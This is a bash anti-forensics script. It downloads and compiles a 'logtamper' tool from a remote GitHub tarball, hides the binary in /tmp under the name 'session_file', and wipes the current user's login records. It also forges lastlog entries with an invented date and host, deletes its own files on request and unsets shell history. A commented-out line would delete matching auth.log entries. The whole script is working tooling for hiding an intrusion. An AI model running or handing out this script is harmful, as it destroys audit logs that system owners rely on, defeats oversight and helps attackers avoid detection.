#!/bin/bash

L_WORKDIR=/tmp/sess_0f8462efe1e7934b5e8bc7da05710465/
L_FILENAME="session_file"
L_URL=https://raw.githubusercontent.com/border/wifihack/master/bin/logtamper_v1_1.tgz

# installing tamper
if [[ ! -d $L_WORKDIR ]]; then
  echo "Tamper not found. Installing..."
  mkdir $L_WORKDIR && cd $L_WORKDIR
  curl -0 $L_URL | tar -zx
  make  -C logtamper/ > /dev/null 2>&1
  mv logtamper/logtamper $L_FILENAME
  rm -rf logtamper/
  strip $L_FILENAME
  echo "Tamper installation successfull"
fi
# end tamper installation

#L_BIN="${HOME}/.cache/lgtm"
L_BIN="${L_WORKDIR}${L_FILENAME}"
#L_BIN="echo"

if [[ -z ${SUDO_USER+x} ]]; then
  echo "Either I am a root or a nobody. Too lazy to find out"
  L_USER=$(whoami)
 else
  echo "Detected sudo environment"
  L_USER=$SUDO_USER
fi

L_ME="$(who -m | cut -d "(" -f2 | cut -d ")" -f1 | tr -d '\n')"

$L_BIN -w $L_USER $L_ME > /dev/null
$L_BIN -h $L_USER $L_ME > /dev/null

echo "Removed entries with username ${L_USER} and host ${L_ME} using ${L_BIN}"

#sed -i "/${L_USER}/d" /var/log/auth.log
#echo "Removed auth.log entries"

# lastlog edit
if [[ $* != *--no-lastlog* ]]; then
  printf "\nEnter new lastlog date:\n"
  read L_LL_DATE_RAW
  printf "\nEnter lastlog new host:\n"
  read L_LL_HOST
  if [[ -n "$L_LL_DATE_RAW"  ]]; then
    L_LL_DATE=$(date --date="${L_LL_DATE_RAW}" "+%Y:%m:%d:%H:%M:%S")
    printf "\nGreat! New date would be set to ${L_LL_DATE} and host to ${L_LL_HOST}\n"
    $L_BIN -m $L_USER $L_LL_HOST pts/0 $L_LL_DATE > /dev/null
  fi
fi

# remove workdir?
if [[ $* == *--remove* ]]; then
  echo "Removing all traces as requested"
  rm "${L_WORKDIR}${L_FILENAME}"
  rm -r $L_WORKDIR && echo "Successfully cleaned after myself"
fi

# clear vars
unset L_BIN L_USER L_ME L_WORKDIR L_URL L_FILENAME L_LL_DATE_RAW L_DATE L_LL_HOST HISTFILE
